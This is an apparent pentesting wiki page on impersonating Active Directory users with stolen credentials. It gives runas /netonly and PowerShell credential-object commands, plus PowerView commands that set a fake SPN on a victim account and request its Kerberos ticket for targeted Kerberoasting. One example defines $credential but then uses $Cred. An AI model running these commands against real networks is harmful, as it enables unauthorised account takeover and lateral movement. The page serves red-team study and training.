# Impersonation

When credentials are found (through [dumping](dumping) or [cracking](cracking.md) for instance), attackers try to use them to obtain access to new resources. Depending on the harvested credential material type, the impersonation can be done in different ways.

* **LM or NT password hash**: [pass-the-hash](../ntlm/pth.md)
* **RC4 Kerberos key (i.e. NT hash)**: [overpass-the-hash](../kerberos/ptk.md)
* **non-RC4 Kerberos key (i.e. DES or AES)**: [pass-the-key](../kerberos/ptk.md) (alias for overpass-the-hash)
* **Kerberos ticket**: [pass-the-ticket](../kerberos/ptt.md)
* **plaintext password**: the techniques listed below

{% tabs %}
{% tab title="RunAs" %}
RunAs is a standard Windows command that allows to execute a program under a different user account. When stuffing an Active Directory account's password, the `/netonly` flag must be set to indicate the credentials are to be used for remote access only.

```bash
runas /netonly /user:$DOMAIN\$USER "powershell.exe"
```

Since the password cannot be supplied as an argument, the session must be interactive.
{% endtab %}

{% tab title="Powershell" %}
In Powershell, it is possible to impersonate a user by create a credential object and supplying it with the `-Credential` argument in the next command.

```bash
# Credential object creation (prompted)
$credential = Get-Credential

# Credential object creation (not prompted)
$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)

# Usage
Start-Process Notepad.exe -Credential $credential
```
{% endtab %}

{% tab title="PowerView" %}
Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential`, `-Domain` and `-Server` parameters that can be used to explicitly specify the user to run as, the target Domain and and the target Domain Controller. Just like the previous "Powershell" tab, the -Credential option has to be supplied with a credential object.

Here is an example for [targeted Kerberoasting](../dacl/targeted-kerberoasting.md).

```bash
# Credential object creation (not prompted)
$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)

# Usage
Set-DomainObject -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' -Identity 'victimuser' -Set @{serviceprincipalname='nonexistant/BLAHBLAH'}
$User = Get-DomainUser -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' 'victimuser'
$User | Get-DomainSPNTicket -Credential $Cred -Domain 'FQDN.DOMAIN' -Server 'Domain_Controller' | fl
```
{% endtab %}
{% endtabs %}

[SharpLdapWhoami](https://github.com/bugch3ck/SharpLdapWhoami) can then be used to make sure the user is correctly impersonated. A standard whoami command will only return the local user rights, not the users impersonated during remote operations (like LDAP queries to the DC).

```powershell
.\SharpLdapWhoami.exe
.\SharpLdapWhoami.exe /method:kerberos /all
```
